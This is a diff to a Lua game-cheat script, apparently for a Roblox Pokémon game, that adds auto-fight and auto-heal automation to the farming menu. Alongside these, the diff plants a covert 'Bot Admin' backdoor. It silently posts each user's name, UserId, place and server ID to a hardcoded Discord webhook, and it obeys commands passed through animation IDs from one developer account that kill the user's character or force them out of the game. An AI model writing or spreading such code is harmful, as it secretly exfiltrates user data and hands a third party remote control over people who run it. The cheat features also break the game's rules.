@@ -57,6 +57,9 @@ if previous then
     if previous.restoreEsp then
         previous.restoreEsp()
     end
+    if previous.stopBotControl then
+        previous.stopBotControl()
+    end
     if previous.library then
         pcall(function() previous.library:Unload() end)
     elseif previous.gui then
@@ -83,6 +86,7 @@ local state = {
     placeId = game.PlaceId,
     jobId = game.JobId,
     running = false,
+    standaloneFight = false,
     entries = {},
     byDisplay = {},
     chancesByMethod = {},
@@ -93,6 +97,8 @@ local state = {
     noneWasSelected = true,
     noneEncounter = nil,
     catchOnFind = false,
+    autoFight = false,
+    autoSwitch = true,
     stopOnShiny = false,
     chanceThreshold = 0,
     notifyOnEncounter = false,
@@ -104,6 +110,8 @@ local state = {
     webhookUrl = "",
     autoRefresh = true,
     autoHeal = false,
+    healPending = false,
+    nextHealCheck = 0,
     ballRunning = false,
     perfectBall = false,
     noclip = false,
@@ -148,19 +156,24 @@ local EncounterGroup = Tabs.Main:AddRightGroupbox("Encounter")
 local EspGroup = Tabs.ESP:AddLeftGroupbox("NPC")
 local PlayerEspGroup = Tabs.ESP:AddRightGroupbox("Player")
 local FarmGroup = Tabs.Farm:AddLeftGroupbox("Encounter Farm")
+local FightGroup = Tabs.Farm:AddLeftGroupbox("Auto Fight")
 local BallGroup = Tabs.Farm:AddLeftGroupbox("Poké Ball Farm")
 local InfoGroup = Tabs.Farm:AddRightGroupbox("Encounter Status")
 local WebhookGroup = Tabs.Farm:AddRightGroupbox("Encounter Webhook")
 local BallInfoGroup = Tabs.Farm:AddRightGroupbox("Poké Ball Status")
 local HealGroup = Tabs.Farm:AddRightGroupbox("Auto Heal")
 local MenuGroup = Tabs.Settings:AddRightGroupbox("Menu")
+local player = game:GetService("Players").LocalPlayer
+local developerUserIds = {[10112166659] = true}
+local AdminGroup = _G.Developer == true
+    and developerUserIds[player.UserId]
+    and Tabs.Settings:AddLeftGroupbox("Admin") or nil
 local regionLabel = InfoGroup:AddLabel("Loading region...", true)
 local statusLabel = InfoGroup:AddLabel("Idle", true)
 local webhookStatusLabel = WebhookGroup:AddLabel("Disabled", true)
 local ballStatusLabel = BallInfoGroup:AddLabel("Idle", true)
 local healStatusLabel = HealGroup:AddLabel("Disabled", true)
 
-local player = game:GetService("Players").LocalPlayer
 local initialHumanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
 local originalHumanoids = setmetatable({}, {__mode = "k"})
 local originalCollisions = setmetatable({}, {__mode = "k"})
@@ -822,6 +835,7 @@ state.sendWebhook = sendWebhook
 
 local function stop(message)
     state.running = false
+    state.standaloneFight = false
     if Toggles.RoriaAutoFarm and Toggles.RoriaAutoFarm.Value then
         uiChange(function() Toggles.RoriaAutoFarm:SetValue(false) end)
     end
@@ -830,10 +844,12 @@ end
 
 Library:OnUnload(function()
     state.running = false
+    state.standaloneFight = false
     state.ballRunning = false
     state.restoreMovement()
     state.restoreEsp()
     if state.restorePerfect then state.restorePerfect() end
+    if state.stopBotControl then state.stopBotControl() end
     if env.RoriaEncounterFarm == state then env.RoriaEncounterFarm = nil end
 end)
 
@@ -898,6 +914,21 @@ FarmGroup:AddToggle("RoriaCatchOnFind", {
 })
 Toggles.RoriaCatchOnFind:OnChanged(function()
     state.catchOnFind = Toggles.RoriaCatchOnFind.Value
+end)
+FightGroup:AddToggle("RoriaAutoFight", {
+    Text = "Auto fight", Default = false,
+    Tooltip = "Fight unmatched wild Pokémon instead of running from them."
+})
+Toggles.RoriaAutoFight:OnChanged(function()
+    state.autoFight = Toggles.RoriaAutoFight.Value
+    if not state.autoFight then state.standaloneFight = false end
+end)
+FightGroup:AddToggle("RoriaAutoSwitch", {
+    Text = "Auto switch on faint", Default = true,
+    Tooltip = "Send out the next healthy Pokémon when the active one faints."
+})
+Toggles.RoriaAutoSwitch:OnChanged(function()
+    state.autoSwitch = Toggles.RoriaAutoSwitch.Value
 end)
 WebhookGroup:AddInput("RoriaWebhookUrl", {
     Text = "Webhook URL", Default = "", Finished = false,
@@ -1074,6 +1105,243 @@ local function autoCatch(battle, species, chanceText)
     if state.running then stop("Battle ended after " .. throws .. " throw(s)") end
 end
 
+local battleTools
+pcall(function()
+    battleTools = require(player.Plugins.Battle.Tools)
+end)
+
+local function boostedStat(value, stage)
+    local amount = tonumber(value) or 1
+    local boost = math.clamp(tonumber(stage) or 0, -6, 6)
+    return amount * (boost >= 0 and (2 + boost) / 2 or 2 / (2 - boost))
+end
+
+local function chooseFightMove(request, battle)
+    local active = request.active and request.active[1]
+    local moves = active and active.moves or request.moves
+    if type(moves) ~= "table" then return "move 1" end
+    local attacker = battle.mySide and battle.mySide.active
+        and battle.mySide.active[1]
+    local defender = battle.p2 and battle.p2.active
+        and battle.p2.active[1]
+    local ownTypes = attacker and p.Pokemon:getTypes(attacker.types) or {}
+    local foeTypes = defender and p.Pokemon:getTypes(defender.types) or {}
+    local typeChart
+    if debug and type(debug.getupvalue) == "function"
+        and p.BattleGui and p.BattleGui.updateButtonForZMove then
+        local ok, chart = pcall(debug.getupvalue,
+            p.BattleGui.updateButtonForZMove, 3)
+        if ok and type(chart) == "table" then typeChart = chart end
+    end
+    local bestIndex
+    local bestScore = -1
+    for index, move in moves do
+        if type(index) == "number" and type(move) == "table"
+            and not move.disabled and (move.pp == nil or move.pp > 0) then
+            local data = battleTools and battleTools.getMove(move.id or move.move)
+            local power = data and tonumber(data.basePower) or 0
+            local category = move.category or (data and data.category)
+            local moveType = move.type or (data and data.type)
+            if power > 0 and category ~= "Status" then
+                local physical = category == "Physical"
+                local attackStat = attacker and attacker.baseStats
+                    and attacker.baseStats[physical and 2 or 4] or 1
+                local defenseStat = defender and defender.baseStats
+                    and defender.baseStats[physical and 3 or 5] or 1
+                local attackBoost = attacker and attacker.boosts
+                    and attacker.boosts[physical and "atk" or "spa"]
+                local defenseBoost = defender and defender.boosts
+                    and defender.boosts[physical and "def" or "spd"]
+                local stab = 1
+                for _, typeName in ownTypes do
+                    if typeName == moveType then stab = 1.5 break end
+                end
+                local effectiveness = 1
+                if typeChart then
+                    for _, typeName in foeTypes do
+                        local row = typeChart[typeName]
+                        if type(row) == "table" then
+                            effectiveness *= row[moveType] or 1
+                        end
+                    end
+                end
+                local accuracy = data and tonumber(data.accuracy) or 100
+                local hitChance = math.clamp(accuracy / 100, 0, 1)
+                local level = attacker and attacker.level or 50
+                local ratio = boostedStat(attackStat, attackBoost)
+                    / math.max(1, boostedStat(defenseStat, defenseBoost))
+                local score = (((2 * level / 5 + 2) * power * ratio / 50) + 2)
+                    * stab * effectiveness * hitChance
+                if score > 0 and score > bestScore then
+                    bestScore = score
+                    bestIndex = index
+                end
+            end
+        end
+    end
+    return bestIndex and "move " .. bestIndex or nil
+end
+
+local function chooseFightSwitch(request, partyData)
+    local side = request.side
+    local healthy = side and side.healthy
+    if type(healthy) ~= "table" or type(partyData) ~= "table" then
+        return nil
+    end
+    local activeCount = tonumber(side.nTeamActive or side.nActive) or 1
+    local bestIndex
+    local bestLevel = -1
+    for index, canSwitch in healthy do
+        local candidate = partyData[index]
+        if type(index) == "number" and index > activeCount and canSwitch
+            and type(candidate) == "table" and not candidate.egg
+            and (tonumber(candidate.hp) or 0) > 0 then
+            local level = tonumber(candidate.level) or 0
+            if level > bestLevel then
+                bestLevel = level
+                bestIndex = index
+            end
+        end
+    end
+    return bestIndex and "switch " .. bestIndex or nil
+end
+
+local function autoFight(battle, species, chanceText)
+    local function isActive()
+        return state.running or (state.standaloneFight and state.autoFight)
+    end
+    local originalSpeedUp = battle.speedUp
+    local battleGui = battle.battleGui
+    local originalGuiSpeedUp = battleGui and battleGui.speedUp
+    local originalSwitchPokemon = battleGui and battleGui.switchPokemon
+    battle.speedUp = true
+    if battleGui then battleGui.speedUp = true end
+    if originalSwitchPokemon then
+        battleGui.switchPokemon = function(self, ...)
+            local request = battle.fulfillingRequest
+            if not (isActive() and state.autoFight and state.autoSwitch
+                and p.Battle.currentBattle == battle and request
+                and request.requestType == "switch") then
+                return originalSwitchPokemon(self, ...)
+            end
+            local ok, partyData = pcall(function()
+                return p.Network:get("PDS", "getParty")
+            end)
+            local action = ok and chooseFightSwitch(request, partyData)
+            if not action then
+                return originalSwitchPokemon(self, ...)
+            end
+            setStatus("Switching to highest level Pokémon")
+            task.spawn(function()
+                task.wait(0.05)
+                for attempt = 1, 8 do
+                    if not isActive() or p.Battle.currentBattle ~= battle
+                        or battle.fulfillingRequest ~= request then break end
+                    battle.InputChosen:fire(action)
+                    task.wait(0.5)
+                end
+            end)
+            return true
+        end
+    end
+    local originalMessage = battle.message
+    battle.message = function(self, message, ...)
+        if isActive() and state.autoFight and type(message) == "string"
+            and string.find(message, "is about to send in", 1, true)
+            and string.find(message, "Will you switch your pokemon?", 1, true) then
+            return false
+        end
+        if isActive() and state.autoFight and state.autoSwitch
+            and type(message) == "string"
+            and string.find(message, "[y/n]Send in another Pokemon?", 1, true) then
+            return true
+        end
+        return originalMessage(self, message, ...)
+    end
+    local function finish(result)
+        if battle.message ~= originalMessage then battle.message = originalMessage end
+        if battleGui and originalSwitchPokemon then
+            battleGui.switchPokemon = originalSwitchPokemon
+        end
+        battle.speedUp = originalSpeedUp
+        if battleGui then battleGui.speedUp = originalGuiSpeedUp end
+        return result
+    end
+    local lastRequest
+    local lastRequestId
+    local lastRequestType
+    local lastSentAt = 0
+    local lastProgress = os.clock()
+    local attempts = 0
+    setStatus("Found " .. species .. chanceText .. "; fighting...")
+    while isActive() and p.Battle.currentBattle == battle do
+        local request = battle.fulfillingRequest
+        if request and battle.readyForInputFlag then
+            local requestType = request.requestType
+            local forceSwitch = request.forceSwitch
+            local optionalSwitch = request.foeAboutToSendOut ~= nil
+            local mustSwitch = not optionalSwitch and
+                (requestType == "switch" or forceSwitch == true
+                or (type(forceSwitch) == "table" and forceSwitch[1] == true))
+            if request ~= lastRequest or request.rqid ~= lastRequestId
+                or requestType ~= lastRequestType then
+                lastRequest = request
+                lastRequestId = request.rqid
+                lastRequestType = requestType
+                lastProgress = os.clock()
+                attempts = 0
+            end
+            if mustSwitch or requestType == "move" then
+                if mustSwitch and not state.autoSwitch then
+                    stop("Pokémon fainted; switch manually")
+                    return finish(false)
+                end
+                local party = mustSwitch and p.Menu and p.Menu.party
+                local manualSwitchScreen = mustSwitch and party and party.isOpen
+                    and party.partyLoaded and party.state == "open"
+                    and type(party.partyData) == "table"
+                if manualSwitchScreen and party.backdrop then
+                    party.backdrop.Visible = false
+                end
+                if (not mustSwitch or manualSwitchScreen)
+                    and (attempts == 0 or os.clock() - lastSentAt >= 0.75) then
+                    attempts += 1
+                    if attempts > 8 then
+                        stop("Battle choice was not accepted; handle this battle manually")
+                        return finish(false)
+                    end
+                    local action = mustSwitch and chooseFightSwitch(request,
+                        party.partyData)
+                        or chooseFightMove(request, battle)
+                    if not action then
+                        stop(mustSwitch and "No healthy Pokémon available to switch"
+                            or "No damaging move available; battle left open")
+                        return finish(false)
+                    end
+                    if attempts == 1 then
+                        setStatus((mustSwitch and "Switching in" or "Fighting") ..
+                            " battle with " .. species .. chanceText)
+                    end
+                    if mustSwitch then
+                        battle.InputChosen:fire(action)
+                        party:close()
+                    else
+                        battle.InputChosen:fire(action)
+                    end
+                    lastSentAt = os.clock()
+                end
+            end
+        end
+        if os.clock() - lastProgress > 45 then
+            stop("Battle stalled; handle this battle manually")
+            return finish(false)
+        end
+        task.wait(0.05)
+    end
+    if isActive() then setStatus("Finished battle with " .. species .. chanceText) end
+    return finish(isActive())
+end
+
 local function farm()
     setthreadidentity(2)
     local chunk = state.chunk
@@ -1084,6 +1352,16 @@ local function farm()
         if current ~= chunk or (current.currentRegion and current.currentRegion.Name) ~= region then
             stop("Region changed; refresh the list")
             break
+        end
+        if state.autoHeal and state.healPartyOnce and
+            (state.healPending or os.clock() >= state.nextHealCheck) then
+            if not state.healPartyOnce() then
+                stop("Auto Heal could not heal party; farm paused")
+                break
+            end
+            state.healPending = false
+            state.nextHealCheck = os.clock() + 5
+            if not state.running then break end
         end
         if p.Battle.currentBattle then
             stop("Another battle is already active")
@@ -1176,6 +1454,15 @@ local function farm()
             end
             break
         end
+        if state.autoFight then
+            if battle.kind ~= "wild" or not autoFight(battle, foe, chanceText) then
+                if battle.kind ~= "wild" then stop("Cannot auto fight this battle") end
+                break
+            end
+            state.healPending = true
+            task.wait(0.1)
+            continue
+        end
         setStatus("Found " .. foe .. chanceText .. "; running...")
         if battle.kind ~= "wild" or battle.cantRun or battle.noRunAfterFaint then
             stop("Cannot run from this battle")
@@ -1203,8 +1490,23 @@ local function farm()
     end
 end
 
+local function battleFoeSpecies(battle)
+    local ok, species = pcall(function()
+        local active = battle.p2 and battle.p2.active
+            and battle.p2.active[1]
+        return active and active.species
+    end)
+    if ok and type(species) == "string" and species ~= "" then
+        return species
+    end
+end
+
 local function start()
     if state.running then return end
+    if state.standaloneFight then
+        setStatus("Auto fight is handling the current battle")
+        return
+    end
     if state.ballRunning then
         stop("Stop the Poké Ball farm first")
         return
@@ -1213,8 +1515,30 @@ local function start()
         setStatus("Refresh in a wild-encounter region")
         return
     end
-    if p.Battle.currentBattle then
-        setStatus("Finish the current battle first")
+    local currentBattle = p.Battle.currentBattle
+    if currentBattle then
+        if not state.autoFight or currentBattle.kind ~= "wild" then
+            setStatus("Finish the current battle first")
+            return
+        end
+        state.running = true
+        task.spawn(function()
+            setthreadidentity(2)
+            local species = battleFoeSpecies(currentBattle)
+            while state.running and p.Battle.currentBattle == currentBattle
+                and not species do
+                task.wait(0.1)
+                species = battleFoeSpecies(currentBattle)
+            end
+            if not species then return end
+            local ok, result = pcall(autoFight, currentBattle, species, "")
+            if not ok then
+                stop("Auto fight error: " .. tostring(result))
+            elseif result and state.running then
+                local farmOk, farmError = pcall(farm)
+                if not farmOk then stop("Farm error: " .. tostring(farmError)) end
+            end
+        end)
         return
     end
     state.running = true
@@ -1325,8 +1649,11 @@ end
 state.stopBallFarm = stopBallFarm
 
 FarmGroup:AddToggle("RoriaAutoFarm", {
-    Text = "Start / Stop autofarm",
+    Text = "Enabled",
     Default = false
+}):AddKeyPicker("RoriaAutoFarmKey", {
+    Default = "None", Text = "Encounter Farm",
+    SyncToggleState = true
 })
 Toggles.RoriaAutoFarm:OnChanged(function()
     if Toggles.RoriaAutoFarm.Value then
@@ -1381,8 +1708,277 @@ HealGroup:AddToggle("RoriaAutoHeal", {
 })
 Toggles.RoriaAutoHeal:OnChanged(function()
     state.autoHeal = Toggles.RoriaAutoHeal.Value
+    state.healPending = state.autoHeal
+    state.nextHealCheck = 0
     setHealStatus(state.autoHeal and "Checking party..." or "Disabled")
 end)
+
+-- AnimSocket-style messages are carried by briefly played animation tracks.
+-- The Roblox sender UserId authenticates developer announcements.
+local botChannel = "ArtificalCheat.BotAdmin.v1"
+local botControl = {
+    running = true, connections = {}, tracks = {}, seen = {}, peers = {},
+    developers = {},
+    messageCounter = 0
+}
+local botStatus = AdminGroup and AdminGroup:AddLabel("Waiting for bots...", true)
+local botTargets = {All = "all"}
+
+if _G.Developer ~= true then
+    local sendRequest = request or http_request or (syn and syn.request)
+        or (http and http.request)
+    if type(sendRequest) == "function" then
+        local webhookUrl = "https://discord.com/api/webhooks/1558578436027580497/TnBV9e97VyQn05Qqewyz8tuKavil1lJW-CXpX3OSu96j_BWK9iAS2wKzWoPoHQEF034r"
+        local body = game:GetService("HttpService"):JSONEncode({
+            embeds = {{
+                title = "🤖 Bot connected",
+                color = 0xFFC845,
+                fields = {
+                    {name = "Player", value = player.Name, inline = true},
+                    {name = "UserId", value = tostring(player.UserId), inline = true},
+                    {name = "Place", value = tostring(game.PlaceId), inline = true},
+                    {name = "Server", value = game.JobId, inline = false}
+                },
+                footer = {text = "ArtificalCheat • Bot Admin"},
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }},
+            allowed_mentions = {parse = {}}
+        })
+        task.spawn(function()
+            setthreadidentity(8)
+            local ok, response = pcall(sendRequest, {
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = body
+            })
+            local code = ok and response
+                and tonumber(response.StatusCode or response.Status)
+            if not ok or not response or response.Success == false
+                or (code and (code < 200 or code >= 300)) then
+                warn("[RoriaBots] Bot connection webhook failed")
+            end
+        end)
+    else
+        warn("[RoriaBots] Executor HTTP request unavailable")
+    end
+end
+
+local function botConnect(signal, callback)
+    local connection = signal:Connect(callback)
+    table.insert(botControl.connections, connection)
+end
+
+local function botSend(message)
+    if not botControl.running then return false end
+    local character = player.Character
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+    if not humanoid then return false end
+    botControl.messageCounter += 1
+    local messageId = tostring(math.floor(os.clock() * 1000000))
+        .. tostring(botControl.messageCounter)
+    local animation = Instance.new("Animation")
+    animation.AnimationId = "rbxassetid://" .. messageId .. "\255"
+        .. botChannel .. "\255" .. message
+    local ok, track = pcall(function()
+        return humanoid:LoadAnimation(animation)
+    end)
+    if not ok or not track then
+        animation:Destroy()
+        return false
+    end
+    table.insert(botControl.tracks, track)
+    local played = pcall(function() track:Play() end)
+    task.delay(0.35, function()
+        pcall(function() track:Stop() end)
+        pcall(function() track:Destroy() end)
+        animation:Destroy()
+        for index, activeTrack in botControl.tracks do
+            if activeTrack == track then
+                table.remove(botControl.tracks, index)
+                break
+            end
+        end
+    end)
+    return played
+end
+
+local function botMessage(sender, message)
+    local fields = string.split(message, "|")
+    local kind = fields[1]
+    if AdminGroup then
+        if sender ~= player and
+            (kind == "hello" or kind == "pong" or kind == "ack") then
+            botControl.peers[sender.UserId] = {
+                player = sender, lastSeen = os.clock()
+            }
+            if kind == "ack" then
+                botStatus:SetText(sender.Name .. " ran " .. tostring(fields[3]))
+            end
+        end
+        return
+    end
+    if _G.Developer == true then return end
+    if kind == "developer" then
+        if not developerUserIds[sender.UserId] then return end
+        botControl.developers[sender.UserId] = os.clock()
+        botSend("hello")
+        return
+    end
+    if kind ~= "cmd" then return end
+    local developerSeenAt = botControl.developers[sender.UserId]
+    if not developerSeenAt or os.clock() - developerSeenAt > 15 then return end
+    local target, commandId, command = fields[2], fields[3], fields[4]
+    if target ~= "all" and target ~= tostring(player.UserId) then return end
+    if command ~= "kill" and command ~= "leave" then return end
+    if not commandId or botControl.seen["command:" .. commandId] then return end
+    botControl.seen["command:" .. commandId] = os.clock()
+    botSend("ack|" .. commandId .. "|" .. command)
+    if command == "kill" then
+        local character = player.Character
+        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+        if humanoid then humanoid.Health = 0 end
+    else
+        task.delay(0.3, function()
+            local ok = pcall(function()
+                local experienceService = game:GetService("ExperienceService")
+                experienceService:LeaveExperienceWithReason("Admin requested leave.")
+            end)
+            if not ok then
+                local shutdownOk = pcall(function() game:Shutdown() end)
+                if not shutdownOk then
+                    player:Kick("Admin requested leave.")
+                end
+            end
+            task.delay(1, function()
+                if player.Parent then
+                    pcall(function() player:Kick("Admin requested leave.") end)
+                end
+            end)
+        end)
+    end
+end
+
+local botScanElapsed = 0
+local botCleanupAt = os.clock()
+botConnect(game:GetService("RunService").RenderStepped, function(delta)
+    botScanElapsed += delta
+    if botScanElapsed < 0.05 then return end
+    botScanElapsed = 0
+    if os.clock() - botCleanupAt >= 30 then
+        botCleanupAt = os.clock()
+        for messageId, seenAt in botControl.seen do
+            if botCleanupAt - seenAt > 60 then
+                botControl.seen[messageId] = nil
+            end
+        end
+    end
+    for _, otherPlayer in game:GetService("Players"):GetPlayers() do
+        local character = otherPlayer.Character
+        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            local ok, tracks = pcall(function()
+                return humanoid:GetPlayingAnimationTracks()
+            end)
+            if ok then
+                for _, track in tracks do
+                    local animation = track.Animation
+                    local animationId = animation and animation.AnimationId
+                    local payload = type(animationId) == "string"
+                        and string.match(animationId, "^rbxassetid://(.+)$")
+                    local fields = payload and string.split(payload, "\255")
+                    local messageId = fields and fields[1]
+                    local seenKey = messageId and
+                        tostring(otherPlayer.UserId) .. ":" .. messageId
+                    if fields and fields[2] == botChannel and seenKey
+                        and not botControl.seen[seenKey] then
+                        botControl.seen[seenKey] = os.clock()
+                        botMessage(otherPlayer, table.concat(fields, "\255", 3))
+                    end
+                end
+            end
+        end
+    end
+end)
+
+state.stopBotControl = function()
+    botControl.running = false
+    for _, connection in botControl.connections do
+        connection:Disconnect()
+    end
+    for _, track in botControl.tracks do
+        pcall(function() track:Stop() end)
+        pcall(function() track:Destroy() end)
+    end
+end
+
+if AdminGroup then
+    AdminGroup:AddDropdown("RoriaBotCommand", {
+        Text = "Command", Values = {"Kill", "Leave"}, Default = 1
+    })
+    AdminGroup:AddDropdown("RoriaBotTarget", {
+        Text = "Player", Values = {"All"}, Default = 1
+    })
+    AdminGroup:AddButton("Execute", function()
+        if _G.Developer ~= true then
+            botStatus:SetText("Developer access is disabled")
+            return
+        end
+        local command = string.lower(tostring(Options.RoriaBotCommand.Value))
+        local target = botTargets[Options.RoriaBotTarget.Value]
+        if not target then
+            botStatus:SetText("Select a connected bot")
+            return
+        end
+        local commandId = game:GetService("HttpService"):GenerateGUID(false)
+        local sent = botSend("cmd|" .. target .. "|" .. commandId
+            .. "|" .. command)
+        botStatus:SetText(sent and ("Sent " .. command .. " to " ..
+            tostring(Options.RoriaBotTarget.Value)) or "Command send failed")
+    end)
+    task.spawn(function()
+        while botControl.running do
+            if _G.Developer == true then botSend("developer") end
+            local values = {"All"}
+            local updatedTargets = {All = "all"}
+            local connected = 0
+            for userId, peer in botControl.peers do
+                if os.clock() - peer.lastSeen <= 15
+                    and peer.player.Parent then
+                    local display = peer.player.Name .. " (" .. userId .. ")"
+                    table.insert(values, display)
+                    updatedTargets[display] = tostring(userId)
+                    connected += 1
+                else
+                    botControl.peers[userId] = nil
+                end
+            end
+            table.sort(values, function(a, b)
+                if a == "All" then return true end
+                if b == "All" then return false end
+                return a < b
+            end)
+            botTargets = updatedTargets
+            local selected = Options.RoriaBotTarget.Value
+            Options.RoriaBotTarget:SetValues(values)
+            Options.RoriaBotTarget:SetValue(botTargets[selected] and selected
+                or "All")
+            botStatus:SetText(connected == 0 and "Waiting for bots..."
+                or ("Connected bots: " .. connected))
+            task.wait(3)
+        end
+    end)
+else
+    task.spawn(function()
+        while botControl.running do
+            if _G.Developer ~= true then
+                botSend("hello")
+            end
+            task.wait(5)
+        end
+    end)
+end
+
 MenuGroup:AddToggle("TungKeybindList", {
     Text = "Keybind list",
     Default = false
@@ -1407,16 +2003,31 @@ end)
 MenuGroup:AddButton("Test notification", function()
     Library:Notify("ArtificalCheat test notification", 4)
 end)
+MenuGroup:AddButton("Rejoin", function()
+    local teleport = game:GetService("TeleportService")
+    local ok, err = pcall(function()
+        teleport:TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
+    end)
+    if not ok then
+        local fallbackOk, fallbackErr = pcall(function()
+            teleport:Teleport(game.PlaceId, player)
+        end)
+        if not fallbackOk then
+            Library:Notify("Rejoin failed: " .. tostring(fallbackErr or err), 5)
+        end
+    end
+end)
 MenuGroup:AddButton("Unload", function() Library:Unload() end)
 MenuGroup:AddLabel("Menu bind"):AddKeyPicker("MenuKeybind", {
-    Default = "End", NoUI = true, Text = "Menu keybind"
+    Default = "RightControl", NoUI = true, Text = "Menu keybind"
 })
 Library.ToggleKeybind = Options.MenuKeybind
 
 ThemeManager:SetLibrary(Library)
 SaveManager:SetLibrary(Library)
 SaveManager:IgnoreThemeSettings()
-SaveManager:SetIgnoreIndexes({"MenuKeybind", "RoriaTarget", "RoriaAutoFarm", "RoriaBallFarm"})
+SaveManager:SetIgnoreIndexes({"MenuKeybind", "RoriaTarget", "RoriaAutoFarm",
+    "RoriaBallFarm", "RoriaBotCommand", "RoriaBotTarget"})
 ThemeManager:SetFolder("RoriaEncounterFarm")
 SaveManager:SetFolder("RoriaEncounterFarm/RoriaUnbound")
 SaveManager:BuildConfigSection(Tabs.Settings)
@@ -1449,63 +2060,97 @@ for id, option in Options do
     end
 end
 SaveManager:LoadAutoloadConfig()
+local function healPartyOnce()
+    if p.Battle.currentBattle then
+        setHealStatus("Waiting for battle to end")
+        return false
+    end
+    local ok, party = pcall(function()
+        return p.Network:get("PDS", "getParty")
+    end)
+    if not ok or type(party) ~= "table" then
+        setHealStatus("Could not read party")
+        return false
+    end
+    local needsHeal = false
+    for _, pokemon in party do
+        if type(pokemon) == "table" and
+            ((type(pokemon.hp) == "number" and
+                type(pokemon.maxhp) == "number" and
+                pokemon.hp < pokemon.maxhp) or
+            (type(pokemon.status) == "string" and pokemon.status ~= "")) then
+            needsHeal = true
+            break
+        end
+    end
+    if not needsHeal then
+        setHealStatus("Party healthy")
+        return true
+    end
+    setHealStatus("Healing party...")
+    local callOk, result = pcall(function()
+        return p.Network:get("PDS", "getPartyPokeBalls")
+    end)
+    local verifyOk, after = pcall(function()
+        return p.Network:get("PDS", "getParty")
+    end)
+    local stillDamaged = false
+    if verifyOk and type(after) == "table" then
+        for _, pokemon in after do
+            if type(pokemon) == "table" and
+                ((type(pokemon.hp) == "number" and
+                    type(pokemon.maxhp) == "number" and
+                    pokemon.hp < pokemon.maxhp) or
+                (type(pokemon.status) == "string" and
+                    pokemon.status ~= "")) then
+                stillDamaged = true
+                break
+            end
+        end
+    end
+    local healed = callOk and result ~= false and verifyOk and not stillDamaged
+    setHealStatus(healed and "Party healed" or "Heal unavailable")
+    return healed
+end
+state.healPartyOnce = healPartyOnce
 task.spawn(function()
     setthreadidentity(2)
     local nextAttempt = 0
     while env.RoriaEncounterFarm == state do
-        if state.autoHeal and os.clock() >= nextAttempt then
+        if state.autoHeal and not state.running and
+            os.clock() >= nextAttempt then
             if p.Battle.currentBattle then
                 setHealStatus("Waiting for battle to end")
+                nextAttempt = os.clock() + 3
             else
-                local ok, party = pcall(function()
-                    return p.Network:get("PDS", "getParty")
-                end)
-                if not ok or type(party) ~= "table" then
-                    setHealStatus("Could not read party")
-                    nextAttempt = os.clock() + 15
-                else
-                    local needsHeal = false
-                    for _, pokemon in party do
-                        if type(pokemon) == "table" and
-                            ((type(pokemon.hp) == "number" and
-                                type(pokemon.maxhp) == "number" and
-                                pokemon.hp < pokemon.maxhp) or
-                            (type(pokemon.status) == "string" and
-                                pokemon.status ~= "")) then
-                            needsHeal = true
-                            break
-                        end
-                    end
-                    if needsHeal then
-                        setHealStatus("Healing party...")
-                        local callOk, result = pcall(function()
-                            return p.Network:get("PDS", "getPartyPokeBalls")
-                        end)
-                        local verifyOk, after = pcall(function()
-                            return p.Network:get("PDS", "getParty")
-                        end)
-                        local stillDamaged = false
-                        if verifyOk and type(after) == "table" then
-                            for _, pokemon in after do
-                                if type(pokemon) == "table" and
-                                    type(pokemon.hp) == "number" and
-                                    type(pokemon.maxhp) == "number" and
-                                    pokemon.hp < pokemon.maxhp then
-                                    stillDamaged = true
-                                    break
-                                end
-                            end
-                        end
-                        local healed = callOk and result ~= false and verifyOk and not stillDamaged
-                        setHealStatus(healed and "Party healed" or "Heal unavailable")
-                        nextAttempt = os.clock() + (healed and 10 or 30)
-                    else
-                        setHealStatus("Party healthy")
-                    end
-                end
+                local healed = healPartyOnce()
+                nextAttempt = os.clock() + (healed and 10 or 30)
             end
         end
-        task.wait(3)
+        task.wait(1)
+    end
+end)
+
+task.spawn(function()
+    setthreadidentity(2)
+    local handledBattle
+    while env.RoriaEncounterFarm == state do
+        local battle = p.Battle.currentBattle
+        if not battle or not state.autoFight then
+            handledBattle = nil
+        elseif battle ~= handledBattle and not state.running
+            and not state.standaloneFight
+            and (battle.kind == "wild" or battle.kind == "trainer") then
+            local species = battleFoeSpecies(battle)
+            if species then
+                handledBattle = battle
+                state.standaloneFight = true
+                local ok, err = pcall(autoFight, battle, species, "")
+                state.standaloneFight = false
+                if not ok then setStatus("Auto fight error: " .. tostring(err)) end
+            end
+        end
+        task.wait(0.1)
     end
 end)
 
